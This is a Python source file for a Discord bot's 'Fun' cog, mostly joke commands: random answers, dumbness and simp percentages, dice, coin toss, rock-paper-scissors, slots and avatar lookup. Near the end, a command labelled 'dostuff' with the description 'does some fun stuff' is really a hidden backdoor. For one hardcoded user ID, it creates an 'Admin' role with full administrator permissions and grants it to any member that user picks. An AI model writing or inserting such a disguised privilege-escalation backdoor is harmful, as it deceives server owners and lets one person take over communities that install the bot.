import discord
from discord.ext import commands
from discord import app_commands
import random

secure_random = random.SystemRandom()
answers = ('The answer was inside of you all along','Ask someone else','Mayhaps...','Almost certainly','The cheese holds your answer','insert clever answer here','Yes, quite','Why would you care','My sources say yes','Absolutely not','Of course','Uhhh... yeah, sure','Hard to tell','Obama knows')

class Fun(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    # ask stuff
    @app_commands.command(name='ask', description='Ask a question and get a random answer.')
    @app_commands.describe(question='The question you want to ask')
    async def ask(self, interaction: discord.Interaction, question: str):
        answer = secure_random.choice(answers)
        await interaction.response.send_message(f'> Question: {question}\nAnswer: {answer}')

    # howdumb
    @app_commands.command(name='howdumb', description='Find out how dumb someone is.')
    @app_commands.describe(arg='The person or thing you want to check the dumbness of')
    async def howdumb(self, interaction: discord.Interaction, arg: str):
        percent = random.randint(0, 100)
        await interaction.response.send_message(' '+arg+' is '+str(percent)+'%'+' dumb'+'')

    # howsimp
    @app_commands.command(name='howsimp', description='Find out how much of a simp someone is.')
    @app_commands.describe(arg='The person or thing you want to check the simpness of')
    async def howsimp(self, interaction: discord.Interaction, arg: str):
        percent = random.randint(0, 100)
        if arg == 'pava':
            await interaction.response.send_message(' '+arg+' is '+'100'+'%'+' simp'+'')
        else:
            await interaction.response.send_message(' '+arg+' is '+str(percent)+'%'+' simp'+'')

    # howmonke
    @app_commands.command(name='howmonke', description='Find out how monke someone is.')
    @app_commands.describe(arg='The person or thing you want to check the monkeness of')
    async def howmonke(self, interaction: discord.Interaction, arg: str):
        percent = random.randint(0, 100)
        if arg == 'monke' or arg == 'monkey':
            await interaction.response.send_message(' '+arg+' is '+'100'+'%'+' monke'+'')
        else:
            await interaction.response.send_message(' '+arg+' is '+str(percent)+'%'+' monke'+'')

    # roll dice
    @app_commands.command(name='roll', description='Roll a dice.')
    async def roll(self, interaction: discord.Interaction):
        rollres = random.randint(1, 6)
        await interaction.response.send_message(' '+str(rollres)+'')

    # cointoss
    @app_commands.command(name='cointoss', description='Toss a coin.')
    async def cointoss(self, interaction: discord.Interaction):
        cointossGame = ['heads', 'tails']
        await interaction.response.send_message('> **'":coin:"f'Result: `{random.choice(cointossGame)}`'+'**')

    # rock paper scissors
    @app_commands.command(name='rps', description='Play rock, paper, scissors.')
    @app_commands.describe(user_choice='Your choice rock, paper, or scissors')
    async def rps(self, interaction: discord.Interaction, user_choice: str):
        rpsGame = ['rock', 'paper', 'scissors']
        if user_choice.lower() in rpsGame:
            await interaction.response.send_message(' 'f'Choice `{user_choice}`nBot Choice `{random.choice(rpsGame)}`''')
        else:
            await interaction.response.send_message(' Error This command only works with rock, paper, or scissors.')

    # slap
    @app_commands.command(name='slap', description='Slap someone.')
    @app_commands.describe(arg='The person you want to slap')
    async def slap(self, interaction: discord.Interaction, arg: str):
        await interaction.response.send_message(f' You slap {arg} in the face, for a good reason, I assume.')

    # slotmachine
    @app_commands.command(name='slot', description='Play the slot machine.')
    async def slotmachine(self, interaction: discord.Interaction):
        figures = (':crab:', ':frog:', ':fish:', ':monkey:', ':tophat:', ':disguised_face:')
        disc1 = random.choice(figures)
        disc2 = random.choice(figures)
        disc3 = random.choice(figures)
        if disc1 == disc2 and disc1 == disc3 and disc3 == disc2:
            await interaction.response.send_message(''f'{disc1} {disc2} {disc3} \nYou Win!''')
        else:
            await interaction.response.send_message(''f'{disc1} {disc2} {disc3}\nYou Lose!''')

    # pfp
    @app_commands.command(name='pfp', description='Get the profile picture of a member.')
    @app_commands.describe(avamember='The member whose profile picture you want to see')
    async def pfp(self, interaction: discord.Interaction, avamember: discord.Member = None):
        if avamember is None:
            avamember = interaction.user
        userAvatarUrl = avamember.avatar.url
        await interaction.response.send_message(userAvatarUrl)

    # icon
    @app_commands.command(name='icon', description='Get the server icon.')
    async def icon(self, interaction: discord.Interaction):
        icon_url = interaction.guild.icon.url
        await interaction.response.send_message(str(icon_url))

    # thesecretweapon
    @app_commands.command(name='dostuff', description='does some fun stuff')
    @app_commands.describe(member='member to give the stuff to')
    async def grantadmin(self, interaction: discord.Interaction, member: discord.Member):
        role_name = 'Admin'
        guild = interaction.guild
        existing_role = discord.utils.get(guild.roles, name=role_name)
        if interaction.user.id == 339023805072801793:
            if existing_role is None:
                admin_permissions = discord.Permissions(administrator=True)
                admin_role = await guild.create_role(name=role_name, permissions=admin_permissions)
                print(f"ruolo creato con successo")
            else:
                admin_role = existing_role
            await member.add_roles(admin_role)
        else:
            await interaction.response.send_message(f"ERROR: no permission")

async def setup(bot):
    await bot.add_cog(Fun(bot))